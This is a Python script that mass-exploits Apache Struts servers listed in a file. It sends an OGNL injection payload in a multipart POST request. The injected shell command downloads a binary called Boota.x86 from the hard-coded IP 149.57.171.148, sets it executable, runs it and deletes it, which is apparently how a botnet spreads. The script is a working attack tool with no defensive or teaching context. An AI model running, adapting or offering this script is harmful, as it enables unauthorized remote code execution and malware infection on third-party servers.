import requests
import sys
import threading
import time

def check(url):
        cmd = "rm%20-rf%20Boota.10wget%3Bwget%20http%3A%2F%2F149.57.171.148%2FBoota.x86%20-O%20Boota.10wget%3Bchmod%20777%20Boota.10wget%3B.%2FBoota.10wget%20x86.wget%3Brm%20-rf%20Boota.10wget%3B"
        command = """
        ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'CMD'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\xe2\x80\x94
        """
        command = command.replace("CMD", cmd)
        print("\033[1;31m\npayload:" + cmd + '\033[0m\n')
        headers = { "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                    "Connection": "close",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"}

        r = requests.post("http://" + url + "/", headers=headers, timeout=5, data=command, verify=False,allow_redirects=False)

def main():
    
    with open(sys.argv[1], "r") as f:
        threads = []

        for ip in f.readlines():
            x = threading.Thread(target=check, args=(ip.strip(),)).start()
            threads.append(x)
            time.sleep(0.02)

        for thread in threads:
            thread.join()


if __name__ == "__main__":
    main()